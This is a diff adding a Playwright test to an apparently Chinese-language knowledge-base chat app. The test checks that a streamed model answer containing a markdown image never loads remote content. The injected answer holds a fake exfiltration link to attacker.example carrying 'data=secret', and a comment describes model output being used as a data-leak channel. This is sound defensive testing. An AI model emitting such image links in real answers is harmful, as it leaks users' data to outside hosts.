@@ -81,3 +81,33 @@ test("streamed answer renders markdown, citations, copy and keyboard-dismissed s
   await page.getByRole("button", { name: "复制回答" }).click();
   await expect(page.getByText("回答已复制")).toBeVisible();
 });
+
+test("a streamed answer never renders remote images", async ({ page }) => {
+  const external: string[] = [];
+  page.on("request", (request) => {
+    if (request.url().startsWith("https://attacker.example/")) external.push(request.url());
+  });
+
+  // A model that echoes a markdown image would turn the browser into an exfiltration channel.
+  const withImage = `${answer}\n\n![追踪像素](https://attacker.example/collect?data=secret)`;
+  await page.route("**/api/v1/knowledge-bases/base-1/questions/stream", (route) => route.fulfill({
+    status: 200,
+    headers: { "content-type": "text/event-stream" },
+    body: [
+      frame("started", 1, {}),
+      frame("delta", 2, { delta: withImage }),
+      frame("sources", 3, { has_answer: true, sources: [source] }),
+      frame("completed", 4, {}),
+    ].join(""),
+  }));
+
+  await page.setViewportSize({ width: 1440, height: 900 });
+  await page.goto("/conversations");
+  await page.getByPlaceholder("例如：这个接口有哪些必填字段？").fill("回答里出现图片链接会怎样？");
+  await page.getByRole("button", { name: "提问", exact: true }).click();
+
+  await expect(page.getByText("已完成", { exact: false })).toBeVisible();
+  await expect(page.getByText("（图片已省略：追踪像素）")).toBeVisible();
+  await expect(page.locator("article img")).toHaveCount(0);
+  expect(external).toEqual([]);
+});
